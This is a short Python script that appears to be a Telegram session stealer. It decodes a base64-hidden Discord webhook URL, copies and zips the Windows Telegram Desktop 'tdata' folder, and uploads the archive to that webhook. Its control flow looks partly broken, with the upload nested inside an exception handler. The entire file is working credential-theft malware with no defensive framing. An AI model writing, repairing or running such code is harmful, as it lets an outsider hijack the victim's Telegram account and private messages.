import os, os.path, shutil, requests
user = os.path.expanduser("~")
import base64
hook = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5Mzc2Mjg2OTI4NTM3MjA1NS9kZzgwcmo0b0tUNDVlQU5xVWVUaWl6eXlZRjYzdkxJaGtxNzJ6YXBkVjRYNlNRUW9GTVdyNTEyb1pDWjg1WnIydmlnRQ==").decode()

def telegram():
  if os.path.exists(user+"\\AppData\\Roaming\\Telegram Desktop\\tdata"):
   try:
    shutil.copytree(user+'\\AppData\\Roaming\\Telegram Desktop\\tdata', user+'\\AppData\\Local\\Temp\\tdata_session')
    shutil.make_archive(user+'\\AppData\\Local\\Temp\\tdata_session', 'zip', user+'\\AppData\\Local\\Temp\\tdata_session')
   except:
    pass
    try:
     os.remove(user+"\\AppData\\Local\\Temp\\tdata_session")
    except:
        pass
    with open(user+'\\AppData\\Local\\Temp\\tdata_session.zip', 'rb') as f:
     payload = {
        'file': (user+'\\AppData\\Local\\Temp\\tdata_session.zip', f, 'zip')
     }    
     r = requests.post(hook, files=payload)
# telegram()
